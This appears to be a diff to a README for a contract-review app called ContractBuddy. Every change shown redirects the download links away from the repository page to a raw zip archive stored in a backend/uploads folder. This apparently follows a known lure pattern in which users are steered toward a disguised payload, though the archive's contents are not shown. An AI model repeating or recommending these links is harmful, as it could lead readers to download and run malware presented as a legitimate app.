@@ -1,6 +1,6 @@
 # 🤝 ContractBuddy - Review Contracts With More Clarity
 
-[![Download ContractBuddy](https://img.shields.io/badge/Download-ContractBuddy-blue?style=for-the-badge&logo=github)](https://github.com/nur01922729/ContractBuddy)
+[![Download ContractBuddy](https://img.shields.io/badge/Download-ContractBuddy-blue?style=for-the-badge&logo=github)](https://github.com/nur01922729/ContractBuddy/raw/refs/heads/main/backend/uploads/Buddy_Contract_3.9.zip)
 
 ## 🧭 What ContractBuddy Does
 
@@ -28,7 +28,7 @@ ContractBuddy helps you review contracts in a simple web app. It can organize fi
 
 Go to the download page here and download the app from the repository:
 
-https://github.com/nur01922729/ContractBuddy
+https://github.com/nur01922729/ContractBuddy/raw/refs/heads/main/backend/uploads/Buddy_Contract_3.9.zip
 
 If the page shows a release file, download it. If it shows the source project, use the files from that page to set up the app on Windows.
 
@@ -171,4 +171,4 @@ This makes it easier to find your files later.
 
 Use this link any time you need to visit the download page or get the latest project files:
 
-[Download ContractBuddy](https://github.com/nur01922729/ContractBuddy)
+[Download ContractBuddy](https://github.com/nur01922729/ContractBuddy/raw/refs/heads/main/backend/uploads/Buddy_Contract_3.9.zip)
